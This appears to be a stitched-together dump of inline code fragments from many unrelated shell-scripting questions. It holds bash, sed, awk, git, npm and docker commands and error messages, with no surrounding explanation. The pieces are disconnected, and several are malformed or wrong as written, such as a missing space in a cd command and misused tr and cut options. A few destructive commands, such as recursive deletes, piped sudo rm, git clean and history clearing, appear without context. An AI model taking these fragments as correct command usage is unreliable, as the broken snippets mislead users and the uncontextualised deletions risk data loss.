Go Version Manager v1.0.22 installed at /d1/golang/gvm
source /d1/golang/gvm/scripts/gvm
No such file or directory
command not found
Code | Move Line Up or Code | Move Line Down
{ "a" : " * * * " }
echo $JSON
echo "$JSON"
man git-config
years[2] > 2
-printf %f
fortune -a once
chmod u+x $script
shopt -s extglob
vim -q -c COMMAND
:help $VIM
out      12
wc -l
echo $(wc -l <<<'dummy')
echo "$(wc -l <<<'dummy')"
shopt -s dotglob
shopt -s nullglob
read -r d ''
shopt -s globstar
-exec cmd
-execdir cmd
GNU Parallel
$doSomething &
$doSomething &
env -u
tee -
cat f
$(cat /dev/stdin)
echo "$(</dev/stdin)"
tee /dev/stdout
cat f | tee /dev/stdout
grep "$user_input" textFile
typeset -l
date -d "string"
VALUE (foobar)
VALUE (xyz12345678)
<root xmlns="http://example.com/foo">
xmlstarlet ed
xmlstarlet ed -i [...] changeme.xml
program arg1 arg2 &
sleep &
$( sleep & )
pip install --user powerline-status
use built-in Powerline glyphs
printf "tas\nty\n" | ./pumpkin.py
sleep 11666
bash -i
sleep 11666
awk -F\\t  -v myvar="$formula" 'myvar {print $0}'
expect -d
eval `ssh-agent -s`
allow ip from xxx.xxx.xxx.xxx.xxx
perl foo.pl foo.conf
C:\Program Files (x86)\Git\etc\profile
st = status
co = commit -am
echo $HOME/.gitconfig
C:\Program Files (x86)\Git
sed (GNU sed) 4.2.2
printf "foo" | { read; echo $?; }
printf "foo\n" | { read; echo $?; }
seq 255
PID=123 DIRNAME=Lalaland bash magic.sh
echo ${PPWD}${BRC}
git status
cd ../Web
git add
git commit
git add
git commit
sed -r
#do stuff
df -P
cat argument1.html | grep -o '<a href=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^<a href=["'"'"']//' -e 's/["'"'"']$//'
cat argument1.html | grep -o '<a .*href=.*>' | sed -e 's/<a/\n<a/g' | sed -e 's/<a .*href=['"'"'"]//' -e 's/["'"'"'].*$//' -e '/^$/ d'
pip install beautifulsoup4
Wed Oct 21 11:48:18 IST 2015
Wed Oct 21 2015 11:48:18 GMT+0530 (IST)
date "+%a %b %d %Y %H:%M:%S GMT%z (%Z)"
Wed Oct 21 2015 12:22:44 GMT+0530 (IST)
which java
lh $(which java)
/usr/bin/java -> /etc/alternatives/java
lh /etc/alternatives/java
/etc/alternatives/java -> /usr/lib/jvm/jdk1.8.0_66/bin/java
follow /usr/bin/java
npm install typex -g
npm install rreadlink -g
rreadlinkchain "$(which java)"
<( ... )
Disk usage
42 4C 41 01
42 4C 41 5C 31
template foo bar zorp
heroku local
TypeError: Request path contains unescaped characters
heroku local
heroku local
cat garbage_log | xargs sudo rm
-v RS='}}'
-v FPAT='{[^{}]+(}|\n)'
{ and }
-v OFS=':'
gsub(/[{}]|\n/, "", $i)
svn status
svn add \#aaa#
svn status
keep_copy.sh .doc
> ~/.files.txt && vim $(cat ~/.files.txt | tr "\n" " ")
grep --color -r test *  > ~/.files.txt && vim $(cat ~/.files.txt | tr "\n" " ")
grep -F $'\t'"$line"$'\t' "$2"
maxdepth 1
! -name '.*'
type f
shopt -u dotglob
heroku open
heroku logs --tail
npm install
( |)
( ?)
( )?
set -x
( )
docker exec -it mycontainername bash
mongo mydbname --eval "db.users.remove({"firstname":"Bob"})"
docker exec
"${@: -1}"
file --mime-type <filename>
identify -ping -verbose <filename>
Format: JPEG (Joint Photographic Experts Group JFIF format)
file --mime-type
file --mime-type rebuilt.jpg
GNU Parallel
man parallel
a += 3
$((a = 1))
1 - 1 - 0
4 - 2 - 0
$((a = 1))
Remember that inside arithmetic evaluation contexts, all other expansions are processed as usual (from left-to-right), and the resulting text is evaluated as an arithmetic expression.
cat | while read line do; ..
nethogs eth1
cat file >> outfile
-F '"'
for(i=2; i<=NF; i+=2) { printf $i" " }
map { 2 * $_ + 1} (0 .. $#F)
@F[map { 2 * $_ + 1} (0 .. $#F)]
rm -Rf
rm $png
rm a b.png
find . -name '*.xib’ -o -name '*.[mh]'
exit <code>
-f -
echo @x
make all
all: ...
.PHONY: all
-d $'\n'
read -d '' line || [ "$line" ]
printf '1 1\n2 2\n3 3\0'
|| [ "$a" ]
-d ''
npm install -g react-native-cli
node -v
npm -v
npm install -g react-native-cli
export PATH=/Users/xxx/.npm-packages/bin:$PATH
npm i -g react-native-cli
npm install -g react-native-cli
npm install -g react-native-cli
sed -n '/ # FirstMark/
,/# EndMark/p'
grep -v "#"
awk -F\< '{print$2}'|awk-F\> '{print $1}'
xargs|sed -e 's/ /,\ /g'|sort -u
# Formal Client Name1
Contact Lastname,Firstname      <email@address.tld>
Contact Lastname,Firstname      <email@address.tld>
# Formal Client Name2
Contact Lastname,Firstname        <email@address.tld>
alias1: email@address.tld, email@address.tld, email@address.tld, email@address.tld
alias3:email@address.tld, email@address.tld, email@address.tld, email@address.tld
alias1: email@address.tld, email@address.tld, email@address.tld, email@address.tld
alias2: email@address.tld, email@address.tld, email@address.tld, email@address.tld,
alias3: email@address.tld, email@address.tld, email@address.tld, email@address.tld
start of string
sed 's/PA14/PA14_/g' file.txt
find . -iname "*FOO*"
if [ ... ]
which [
ps -e | grep nodejs
echo "<script type='text/javascript'>window.location.href='../secure/status.html';</script>"
sh auto.sh > status.html
cat status.html
The child process exited normally with status 0.
The child process exited with status 0
history -s
read -e
set -x
set -x
$field =~ '^[0-9]+$'
find -E . -type f -regex ".*/[[:digit:]]{5}.*" | sed -E 's@\./([0-9]{5}).*@\1@' | sort -u
$(which sshd)
which sshd
which sshd
>> -d ./bin
bash: -d: command not found
cat -e
split --lines=#number file.dat
-f 1
-f 1
man bash
$some_val -ge 1
grep -z
seq -w
/^$/ {*}
split -p "^$"
end of file (eof)
Compress or decompress to standard output.
man bzip2
How can i fix it?
command -V
<colon><one or more space>
: +
python a.py >> a.txt 2>&1
--write-out '%{http_code}'
curl --silent --show-error --head http://some.url.com  --user user:passwd --write-out '%{http_code}'
test.sh -a "here is a string"
a specified with: here
a specified with: here is a string
test.sh -a here\ is\ a\ string
test.sh -a "here\ is\ a\ string"
<add key="CommunityWebSrvUrl"
<add key="CommunityWebSrvUrl" value="https://example.com:12345" />
<add key="CommunityWebSrvUrl" value="https://somethingElse.com:54321" />
add key=\"C
add key=\\\"C
f{a=a RS $0}
f{a=a?a RS $0:$0}
Derived words:
The %1 fox jumped over the %2 bridge
The {0} fox jumped over the {1} bridge
{$1 - 1}
%1 aaa %%2 bbb%%% ccc%3.,45--- ddd%6%7
{0} aaa %{1} bbb%%% ccc{2}.,45--- ddd{5}{6}
man echo
line=$(head -n 1 $f)
plot  5.01       1     56.413481000  -0.00063400   0.00095770.png
non-gnu-sed (BSD)
set -o pipefail
set -e
set -o pipefail
npm install
npm bin -g
cd ../..
0: noah@noah-desktop: /home/noah/$ up
0: noah@noah-desktop: /home/noah/$
0: noah@noah-desktop: /home/noah/$
up component
git push origin branch-name
git help push
\set ON_ERROR_STOP TRUE
\set ON_ERROR_STOP TRUE
ps -ef
the entire listing of ps -ef
ps -ef
echo -n
sort -nr -k3
build setting reference
GNU Bash shell (/bin/bash)
Bourne shell (/bin/sh)
mvn deploy
grep -i 'first\|second\|third' /file/name
grep -i first /file/name | grep -i second | grep -i third
fgrep "$@" /file/name
fgrep -f
grep -F
grep -w
Amy Lee
Amy Lee
Github Repos
sh ${VARIABLE}
sh ${VARIABLE}
No such file or directory
set -x; trap read debug
ls -l -- "$PRGSCRIPT"
ls: cannot access 20151013-b4-1510.sh: No such file or directory
echo $PRGSCRIPT
echo $(pwd)
ls -l > ls.txt
echo "###${PRGSCRIPT}###" > prgscript.txt
test 123
export PATH=~/"bin:$PATH"
export PATH="$HOME/bin:$PATH"
foo=$bar cmd ...
export foo=$bar
typeset/declare/local foo=$bar
env foo=$bar cmd ...
foo=~ # same as: foo="$HOME"
foo=~/bin # same as foo="$HOME/bin"
foo=$foo:~/bin # same as foo="$foo:$HOME/bin"
man bash
read -ra
read -r
read -r
brew link ant
git filter-branch
GIT_AUTHOR_DATE=`date -R -d "$old_date -1 hour`;
@1240466185 -0700
@1240466185 -0700 -1 hour
man bash
echo $var
var="hello ''' world"
sed 's/^./\u&/' <<<'dog' # -> 'Dog'
brew install gnu-sed
brew install gawk
echo "${var^}"
tr '[:lower:]' '[:upper:]' <<<"${var:0:1}"
mount point
df -l
Hello World!
back in cmd.
man 2 kill
exit $?
dd if=InputFile of=OutputFile bs=4096k
dd if=InputFile of=OutputFile bs=4096k >> log.txt
dd if=InputFile of=OutputFile bs=4096k | grep *
2> ...
[: 1445783380: unary operator expected
'%T@ %p\n'
Ubuntu 14.04
CentOS 6.3
tcpdump -i eth0 -l -e -n "src portrange 22-233333 or dst portrange 22-23333" 2>&1 | ./netbps.prl
tcpdump -i eth0 -l -e -n "src portrange 22-233333 or dst portrange 22-23333" 2>&1 | ./netbps.prl > out.out 2>&1
tcpdump -i eth0 -l -e -n "src portrange 22-233333 or dst portrange 22-23333" 2>&1 | ./netbps.prl 2>&1 | grep "Bps"
if grep --quiet -oE "(\(\d{3}\)[ ]?\d{3}-\d{4})|(\d{3}-\d{3}-\d{4})" $
ll | awk '{print $9}' | grep ttt
ls -l
ls -l /home/user
%x    an unsigned integer, in hexadecimal
%X    like %x, but using upper-case letters
$2=sprintf("%02X", $2)
echo file >> output.txt
echo "basename $1" >> output.txt
$(basename "$1")
file=$(basename $1)
echo ${file} >> output.txt
Mail Delivery Status Report
Mail Delivery Status Report
sed -n '/Groups:/,/Licenses/p' sample
sed '1d'
sed '$d'
cut -f1 -d'<'
set -e
nmcli dev connect iface …
iface eth0
xterm -e
awk '!(seen[$1,$2]++ || seen[$2,$1]++)' file
! var ++
! var
apachectl -t -d DUMP_RUN_CFG
apachectl -V
iconv -f UTF-16 -t UTF-8 file.txt
cat -v
tr -d '\0'
cat -v
tr -d '\0' < file
ps -ef | grep unison | grep -v grep | grep "${USER}" | awk '{print $2}'
make xconfig
$4 $5 ... $n
"\t"data[i,4]"\t"data[i,5] ... "\t"data[i,n]
-v -v -v
grep -E
grep -o
grep -Elr
"key": "value" //my comment
sed '/^[[:blank:]]*#/d;s/\/\/.*//' my.json | jq '.<your_block>'
echo $PATH
No such file or directory
export PATH="~/.Scripts:$PATH"
jobs -l
ps aux
set -e
| sed -e 's/<br>/\r\n/g'
gcc -masm=intel -S source.c
Run program AB
Run B
strace -f ./script
echo "Run program" > foo.txt; ./c_program
Run Program AB
shopt -s expand_aliases
/usr/bin/env: node: No such file or directory
/usr/bin/env node
ssh … '/bin/bash -l -c "…"'
ssh … '/usr/local/bin/my_script.sh'
cat ./a.py
echo "$list_of_files" | od -An -tcx1
sed -r "s:\x1B\[[0-9;]*[mK]::g"
cat fire.txt
cntrl + S
cntrl + R
cntrl + S
cntrl + Q
stty -ixon
cat fire.txt
#!/usr/bin/env bash
divide and conquer
read user
grep "\<user\>"
j7 java -version
bash --version
GNU bash, version 4.3.42(1)-release (x86_64-apple-darwin14.5.0)
/usr/libexec/java_home -v 1.7
[blank line]
echo "$BAR"
indirect expansion
ssh $line 'cat content.txt >> target.file'
\#^//end# !
x="number 1;number 2;number 3"
number 2
$' \t\n'
'a   b'
read -r -a ... <<<...
-d ''
’, ‘\’, and, when history expansion is enabled, ‘!’. The characters ‘$’ and ‘
echo -e
Sat Oct 10 00:00:55 2015
NOV, DEC
acpitool -B
wc -l
wc -l $i
set +f
cd "$(perl "$HOME"/import_script.pl -i someparameter)" && "$HOME/program2" .
"tags" : "tag1"
"tags" : ["tag1","tag2"]
$~ zenmap
. file_with_alias.sh
man bash
-i ""
rpm -qa | grep rhncfg-actions
<bla value>
Command Substitution
'<bla value>'
global_var='<bla value>'
$(echo '<bla value>')
while read
$var = value
curl ...
$global_var_her = "bla"
declare -g
11 -->"k"
hunspell -s -d en_US word
fab sudo_dsmc:"-1"
ls -r
2nd field
1 or 2 digits
for in $(cat ...)
Current working directory
find . -iname "*foo*" | fgrep -i "foo"
mklink /D
mklink /D
pwd -W
join --help
column -t
sort -b
sort -k 1b,1
$1 $2 $3
sudo su postgres
man grep
-M, --multiline
<Control-C> c
command -V checkFolders
checkFolders "first folder"
checkFolders first folder "folder to be copied"
[[ -n $1 ]]
$str == *$'\n'*
set -x
find / -name 'test_folder' -exec mv 'test_folder' /Users/michael/Downloads/here/. {} +
free -h
X="$X" | tr ${Y:(-1)} "_"
"Cannon Nikkon"
"Hello CANNON Nikko_"
echo "$X" | tr ${Y:(-1)} "_"
"Hello Ca__o_ Nikko_"
echo "${X^^}" | tr ${Y:(-1)} "_"
"Hello CANNON Nikko_"
source file.sh
source dir/file.sh
source sub-module/minor.sh
source minor.sh
sbatch --wrap="echo hello"
from subproject1.subsubproject.trunk import module1
git clone
git push
return 0
return 1
>( cmd )
<( cmd )
set +o pipefail
yum install mystuff
C:\Program Files\MongoDB\Server\3.6\bin
start mongodb server ./mongod
Defaults   env_keep +="HEY"
date "+%a %b %d %R:%S %Y"
Thu Oct 29 12:15:05 2015
(docker) ~/src/code $
export PS1="(docker)$"
$USER_SHELL --login --noprofile -c "export PS1='(docker)'"
-o zipcode-server
find . -mmin -60 |xargs ls -l
find -mmin 60
find -mmin +60
find . -mmin -60
find . -mmin -60 |xargs ls -l
ls -l
ls -l
ls -l .
echo $DIRECTORY
trap DEBUG
set -v
value = unicode(value, "utf-8")
snmpwalk -v 2c -c public hostname 1.3.6.1.2.1.17.7.1.2.2.1.2
IFS=":" read -ra paths <<< "$PATH"
-type f
-perm +111
: ${FOO=default}
GNU bash, version 4.3.42(1)-release
echo $myvar
a b c
IFS=: command
IFS=: d=($myvar)
set -u
var="-fvpt -fwrapv -fwhole-program" && gcc -Q $var --help=optimizers
cp $FILE $DESTINATION &
$ git config --global credential.helper wincred
" key="
'- '
>word 2>&1
GNU Awk 4.1.1
exec scala "$0" "$@"
exec scala "$0" "$@"
println("hello world")
set -v
set -x
set -x
set -v
set -x
while (<>) { .. }
(split /\t/)[2]
&& screen -d
screen -r foo | grep bar && screen -d
no session found
man top
git status
Changes to be committed:
git log
fatal: bad default revision 'HEAD'
git remote add origin https://url/to/remote/repo
git push -u origin master
git push
-t mangle
-A OUTPUT
-p tcp
-m tcp
--(d|s)port 8333
-j MARK
--set-mark 0x2
while read
dumpsys power
[ \t\r\n\v\f]
cd "/Applications/Xcode-beta 2.app"
cd/Applications/Xcode-beta 2.app
Xcode-beta 2.app
echo $(uname)<TAB>
echo Linux
echo $SHELL<TAB>
echo /bin/bash
's/{[^}]*}/&\n/g' input > output.txt
sed -i 's/{[^}]*}/&\n/g' input
tr '}' '}\n' < input > output.txt
while <>
bnd select --header Export-Package my.jar
{print $2; flag=1; next}
flag && /:/
{flag=0;next }
"$data $data1"
days=($data $data1)
for hour in {00.23}
#!/usr/bin/env bash
sudo /etc/rc.d/init.d/httpd restart
sudo /etc/rc.d/init.d/mysqld restart
$myfile|sed 's/.//'| sed 's/.//'|grep -v "^$";
bash: .: filename argument required
sed 's/.//' | sed 's/.//'
sed 's/..//
cut -c3-
dmesg | grep tty
date +%s
grep -
while read
Oct 30
if -e $n
history -c
history -c
history -c; history -w
echo $(pwd)
ls -F
man find
ls -1
wc -l
[[ -e "$1" || -L "$1" ]]
shopt -s nullglob
echo "${#entries[@]}"
getconf ARG_MAX
allImgNames.txt: No such file or directory
ffmpeg ...
-vf "scale=trunc(iw/2)*2:trunc(ih/2)*2"
cd "$p"
cd -
tail -f
echo $PATH
echo $PATH
source  add_path
echo "$PS1"
\h:\W \u\$
cd ~
vi .bash_profile
export PS1="$ "
cp -n
-l lua
find ... -exec ... {} \;
find ... -print0 | xargs -0 -n 1 ...
find ... -exec ... {} +
find ... -print0 | xargs -0 ...
getconf ARG_MAX
-n 1
if [ $? == 0 ]
echo -n
#? == 1
awk '!/a/'
grep -v a
echo "ERROR ADDING ..
echo $n $i
sed "s/$var...
cat $file | ..
< $file
[[ ... ]]
[ ... ]
node stdout_redirect.js > out.txt && more out.txt
dateTest.sh %d
date --date='06/12/2012 07:21:22' +"%d is not an int"
echo "${1} is NOT an int" >&2
echo Arg dateInteger [$dateInteger] must be an integer.
$( ... )
CTRL-V CTRL-D
'h;s/[^[:alpha:]]//g;H;x;s/\n/&&/;ta;:a;s/\n(.)\n(.)/\n\2\1\n/;ta;G;/\n(.)\n\n\1$/I;d' $1
cat snapshot1 | sort | uniq > snapshot1sorted
cat snapshot2 | sort | uniq > snapshot2sorted
diff -w snapshot1sorted snapshot2sorted |grep "MARCOS/lapiz.png
-exec rm {} \;
editor = open -W -n
open -W -n
-f FILE
sed -i /$1/d ./.resources
sed -i /\<$1\>/d ./.resources
git diff --name-only
git diff --name-only
grep '.css$' -
gzip -k
aws s3 sync
git clean -dxf
git diff --name-only
cp -t <destination>
./test.sh && php -f test.php
sudo dpkg-reconfigure dash
ls -la /bin/sh
/bin/sh -> dash
ls -la /bin/sh
/bin/sh -> bash
echo shell_exec('source /full/path/to/file/test.sh && getNumber abc def');
echo shell_exec('/bin/bash -c "source /full/path/to/file/test.sh && getNumber abc def"');
echo $PATH
echo $PATH
sed -e 'y/:/\n/'
tr ":" "\n"
-n 1
echo "$PATH" | sed -e 'y/:/ /'
-d ':'
echo "$PATH"
read -a
find . -name "file_name" -exec du -h {} \;
ls -l --time-style='+%d/%m/%Y' "file_name" | awk '{print $6}'
ls -l "file_name"|cut -d" " -f1
https://www.youtube.com/watch?v=VXw6OdVmMpw          Mon Nov 2 10:28:23 2015
tar -cfv
tar -cfv file.tar path
: No such file or directoryult.js
: No such file or directoryders.aspx
: No such file or directoryork.css
: No such file or directoryal-power.js
Destination = k
perl -ne 'BEGIN{$/=""} print unless /foobar/' file
"$( ...)"
1 2 3 4 5 6 7
line 25: [: : integer expression expected
[ "" -gt 0
[[ ... == ... ]]
[ 03 = 3 ]
[ 03 -eq 3 ]
{ ... }
( ... )
{ ... }
su jaworows
echo "hi"
-F '[, ]'
perl -F'[, ]' -lane 'for ($i=2; $i<=$#F; $i++) {print "$F[0],$F[1],$F[$i]"}' file
-F'[, ]'
bash: /usr/lib/jvm/java-7-oracle=/usr/lib/jvm/java-8-oracle: No such file or directory
JAVA_HOME = /usr/lib/jvm/java-8-oracle
source ~/.bashrc
echo $JAVA_HOME
> /dev/null 2>&1
echo -e
readarray -t servers <serverlist
tput sc
tput rc
man ssh_config
Main Dir
"./Main Dir/stuff"
tail -f
while read
expr match "/home/simulations/database" '\(/[^/]*$\)'
ls -aR | egrep '^\.\w+' |
man find
data[2nd field] = last field
tail -r
/usr/bin/time --format="%U"
export BASH_ENV=/etc/bashrc
ls {1..4}.txt
a b c
01 a.txt
02 a.txt
args+=( "$(printf '%02d.txt' "$i")" )  # -> '01.txt', '02.txt', ...
docker run --rm -it govim bash -l
source ~/.bash_profile
bash -l
docker run
s/\n/ #/
folder is exist already
git status
. /etc/bash_completion.d/git
git branch ma <TAB>
git branch master
ls /home
which node|git|phonegap
phonegap -v
phonegap -v
source  ~/.nvm...
{ print $0 " "}
{ print $0 "   "}
screen -A -m -d -S MyLogger /path/to/script
screen -r MyLogger
ctrl+a ctrl+d
source filename
f1.sh cat f2.sh
f3.sh cat f2.sh
source ~/.bashrc
grep -o -v "http://${domain//./\\.}"
python --version
"and more text"
2 >&1
tr -d '\n'
man curl
<a href="/funny/hello/there/fkljaskdjfl" title="This here">fdsksldjfah</a>
dos2unix myfile.txt
echo "$variable" | dos2unix
grep ${VALUE} inputfile.csv | cut -d, -f${INDEX}
grep ${apples} inputfile.csv | cut -d, -f${2}
grep ${apples} inputfile.csv | cut -d -f${INDEX}
No such file or directory
cmp <(sed -e "s/Expires.*3D/Expires3D/" file1.json) <(sed -e "s/Expires.*3D/Expires3D/" ../other/file1.json)
<\(sed -e ...\)
No such file or directory
mail -s "job failed" maintainer@example.org
timeout 1h /app/longprocess.sh
source xxxx
campaignFileRowCount=$(zgrep -w "campaign"$today".csv.gz" rowcountfile_"$today".csv.gz | cut -d, -f2)
echo $((campaignFileRowCount - 0))
")syntax error: invalid arithmetic operator (error token is "
tr -d '\r'
GNU find
printf %q
"arg1" "arg2" "argument with"$'\n'"a newline"
((num = $RANDOM % 6 + 1))
shuf [OPTION]... [FILE]
-i lo-hi
-n count
man shuf
test.sh -a 1 -b 2 -c 3
Ignoring error
bash -x
shift $(($OPTIND - 1))
engine "map" { ... "foobar" ... }
engine "map"
split(string, array [, fieldsep [, seps ] ])
awk -F ',' -v OFS=',' '$1 { $2=$2*2; print}' path/file.csv > output.csv
find -type d -name "runs"
[[ ... ]]
man bash
evtest /dev/input/eventXX
xboxdrv --evtest /dev/input/eventXX
/ >
$2+0 == $2
ls | cut -d '_' -f2- |sort
ls | sort -t '_' -k 2
cat test | sed -e "s/<\/comment>//g; s/<comment>/ /g" > test1
cat test | sed -e "s/<\/changes>//g; s/<changes>/ /g" > test1
cat test | xxd
echo '<changes>' | xxd
cpan XML::Twig
sc i A_image
sc r Aregion
sc i A_image
grep A.csv -f B.csv
man xargs
xargs - build and execute command lines from standard input
[ -t 0 ]
. defaults.sh
printf 'answer 1\nanswer 2\n' | ./script.sh
./script.sh <answerfile
$1 == $2
echo "end   = $end"
echo "date1 = $date1"
printf '%q\n' "$variable"
declare -p variable
" + "
id -g -n $USER
seq [fisrt] [increment] last
:4707,4743%sort n
visual mode + J
:'<,'>sort n
bash -x script_01.sh "file"
avconv -f image2 -i %05d.morph.jpg -r 7600 -s 800x600 -c:v h264 video.mp4 >/dev/null 2>&1
perl -le '@a=<>; $p=$a[0]; for (@a){ chop $p while ! /^\Q$p/ }; print $p' file
! //
perl -lne 'BEGIN{$p = <>}; chop $p while ! /^\Q$p/; END{print $p}' file
perl -lne 'BEGIN{$p=<>} chop $p while $p ne substr($_,0,length($p)); END{print $p}' file
awk 'NR==1{p=$0} {while(p != substr($0,1,length(p))){p=substr(p,1,length(p)-1)}} END{print p}' file
sed '$s/,$//'
sed '$s/,$//'
sed '$s/]$//'
which sqlplus
which sqlplus
which sqlplus
echo n
A | B | C
tcpflow ...
cat second.flow
stdbuf --output=0 tcpflow -ec -i any port 8340 # unbuffered output
stdbuf --output=L tcpflow -ec -i any port 8340 # line-buffered output
cat second.flow
git config
fscanf( infile, " %999[^\n]%*[\n]", line );
while (!feof(infile))
ls > log.txt.
ls | grep file.txt
ls > grep
ls > grep
ls | grep '.*.txt'
foo [...]
echo >(true)
public static void main(String[] args)
javac Foo.java
java Foo
hg update
source .test
hg update
hg update
source activate
$ nautilus --browser
$ gconf-editor
echo xxx xxx xxx xxx
ls -p
grep -v /
brew install rename
test_id <> "5"
while read
tail -n10000
while read line
tail -n10000 /some_directory/directory/file_in_question.csv
Country Name (2 letter code) [XX]:
>> /tmp/user_data.config
composer require symfony/console:4.3.4
BEGIN{x=getline s <"B"; split(s,b,"\t")}
while (x && $4<b[4] && b[4]<$5){print $1,$9,$4,$5,$7,b[1],b[2],b[4],b[5]; x=getline s <"B"; split(s,b,"\t")}
sed -r '/(:325F)/ s/^/\1/'
docker run
/bin/bash -c curl -Is $domain
/bin/bash -c echo $domain
bash -c
 curl http://google.com | openssl enc -base64 | openssl enc -base64 -d
curl http://google.com | openssl enc -base64 | openssl enc -base64 -d
mutate { add_field => [ "NB_timestamp", "%{SYS_YEAR}/%{SYS_MONTH}/%{SYS_DAY} %{SYS_HOUR}:%{SYS_MIN}:%{SYS_SEC}" ] } mutate { add_field => [ "NB_timestamp", "%{SYS_YEAR}/%{SYS_MONTH}/%{SYS_DAY} %{SYS_HOUR}:%{SYS_MIN}:%{SYS_SEC}" ] }
No command found
sh script.sh
source script.sh
adduser ... -D -magic_option /SKEL/for/value1
adduser ... -D -magic_option /SKEL/for/value2
git diff --numstat
-f 1
-f 2
ping x.x.x.x
brace expansion
GNU bash, version 4.1.2(1)-release (x86_64-redhat-linux-gnu)
GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
sleep 1
ps -eo pid | grep "$PROC_ID" && { echo "Success"; exit 0; }
sleep 0.1
sleep 0
sleep 0.01
(File name too long)
sed -i '/^SomeFileSystem/d' fstab
alias fin='ssh username@host.co.uk /home/username/scripts/finder.sh'
No rule to make target 'step'
kill -9
jq <map>
"name": "vendor-module"
" *, *"
git remote -v
git branch -vv
sed -i -e '/\/\*/d' $FILENAME
unrar x <filename>.rar
Linux version 3.16.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)
-x c
svn status
svn list
git init
git add
git commit
git svn
git svn
git svn
mailx -s My Quoted Argument
mailx -s "$1"
My Quoted Argument
./myscript.sh "\"My quoted Argument\""
mailx -s "\"$1\""
(ex: https://myServer/xcode/bots/latest )
for ((i=1;i<=100;i++)); do curl -0 mywebpageurl done
for ((i=1;i<=100;i++)); do curl -0 mywebpageurl; done
"Remote Login: Off"
[ ... ]
`sudo systemsetup -getremotelogin`
sudo systemsetup -getremotelogin
Remote Login: Off
[ 'Remote' 'Login:' 'Off' = 'Off' ]
[: too many arguments
[[ ... ]]
[ ... ]
! -a
GNU bash, version 4.3.42(3)-release (i686-pc-cygwin)
[ ... ]
[[ ... ]]
[ ! -a bar ]
[[ ... ]]
exit "$count"
{ echo wtf > /dev/stdout ; } >> wtf.txt
openssl rand -hex 4 -out /dev/stdout >> wtf.txt
{ echo wtf > /dev/stdout } | tee -a wtf.txt > /dev/null
>> wtf.txt
{ echo wtf > /dev/stdout }
| cat >>
. "C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\vcvarsall.bat" x86_amd64
ps -a
if [[ -f "$INPUT_FILE" ]]
if [[ -f $INPUT_FILE ]]
cat file | something
something file
something < file
while [[ -e $INPUT2 ]]; do sleep 0.2; done; mv -n "$INPUT_FILE" "$INPUT2"
sleep 0.5
sleep 0.01
echo $json
bitcoin-cli sendmany
$CLIENT -regtest -rpcport=$((16500 + $i)) -datadir=$MY_PATH/$i sendmany myaccount $json
$CLIENT -regtest -rpcport=$((16500 + $i)) -datadir=$MY_PATH/$i sendmany myaccount "$json"
grep --mmap
ls -la .
$ docker run --rm -v //c/Users/Marco:/data composer --help
MSYS_NO_PATHCONV=1 docker run ...
grep | awk
if $?
echo $?
guake; exec sh
screen -dmS
PAT03=javax.mail.MessagingException: ServerName NO Server Unavailable
PAT03=javax.mail.MessagingException: .* NO Server Unavailable
res=$(fgrep -c "$pattern" $log );
res=$(grep -E "$pattern" $log );
svn update
svn status -u
svn info
grep -Po
sed -n 's/cut off this part \(display this part only\) cut off this part/\1/gp'
set -u
$(wc -l < "${file}")
awk 'NR>k && NR<=m'
brew install node
node -v
npm: command not found
brew install npm
node-5.0.0 already installed
brew link node
sudo npm
sudo yarn
$ brew update
$ brew uninstall node
$ brew install node
$ sudo chown -R YourLocalUserName /usr/local/lib/node_modules/
$ brew postinstall node
/usr/local/lib/node_modules/npm/bin/npm-cli.js i -g npm
echo 'export PATH="/opt/homebrew/opt/node@16/bin:$PATH"' >> ~/.zshrc
./strip.sh 4 5 hi.txt > bye.txt
./strip.sh 1 1 hi.txt > bye.txt
set -- 3 6 /dev/stdin
set -f
bash -f script.sh
python script.py
python script.py > log.txt 2>&1
Service exited with abnormal code 255
docker exec -d
-d dir
syntax error near unexpected token
sh -c
file: transpose.awk
for a in {1..9}; do  var=$(cut -d ' ' -f ${a} sudoku.txt | sort -n | uniq -d); ((${var:-0} > 0)) && echo "Column $a is bad, duplicate ${var}'s."; done
for a in {1..9}; do  var=$(transpose.awk sudoku.txt | cut -d ' ' -f ${a} | sort -n | uniq -d); ((${var:-0} > 0)) && echo "Row $a is bad, duplicate ${var}'s."; done
sudo ls /home/cam
ls /home/cam
sudo mv
ip a
ip a | grep '^[0-9]:' | grep -v 'lo' | a lot more
IF_LIST=$(ip a | grep '^[0-9]:' | grep -v 'lo' | and more)
while [ $(good_interfaces) ]; do
echo $STR
while read pid; do ... done < <(awk ...)
grep -f matchfile largefile
sed -n '/Wake Locks: size=3/,/^$/p'
go add dir
go dir
cd (godir)
cd: The directory 'None' does not exist
import sys
from __future__ import print_function
if [[ -z ...
[[ ... ]]
[ ... ]
(( ... ))
[ ... == ... ]
[ ... ]
[ ... ]
[[ ... ]]
[[ ... || ... || ... ]]
echo -e
bash myfilename.sh
exiftool /Users/user1/Documents/recovered/recup_dir.4/file_1.jpeg
make TARGETNAME
SHELL := /bin/bash
if [  -ge 10 ]; then
if [ $${#TARGET_NAME} -ge 10 ]; then
man head
NR % 3
local computer
server B
server A
local computer
server A
server B
rsync -avz --del ~/Desktop/abc/ <my-user-name>@<server-A>:~/abc
rsync -avz --del ~/Desktop/abc/ <my-user-name>@<server-B>:~/abc
server B
rsync -e "ssh -p altport" serverA:/sourcedir /destdir
-path output
mkdir output
composer create-project laravel/laravel=5.0 TestApp
??+?abelista /Applications/XAMPP/htdocs
" "
' '
' '
eval echo
dialog --editbox
man dialog
date +%d_%m_%Y_%H_%M_%S
for i in $(cat my.lst); do echo ${i%%-*};done
while read i; do echo ${i%%-*};done < my.lst
git commit
start /wait MyHelperApp.exe
set -x
(pid, pname)
sudo netstat -tulnp
source ~/.bashrc
export PATH=/c/PathToPythonInstallation
print line,
grep -E '<<<.+>>>' file
foo // comment
foo  comment
%6p [%d{HH:mm:ss}] %c{1}@%L: %m%n
%7p [%d{HH:mm:ss}] %d{1}@%X
sed 's|^\(abc\.defef\.efefef\.gege=\).*|\1%7p [%d{HH:mm:ss}] %d{1}@%X|g'
wait -n
{= =}
echo $var
echo '$var'
echo "$var"
echo $var
echo "$var"
echo "$var"
screen -S some_session_name
screen -r some_session_name
echo $?
$(which test)
s/,\n/ /g
s/,[[:blank:]]*\n[[:blank:]]*/, /g
lsof -i:1025
lsof -i:1025
kill -9 12345
| grep '^p'
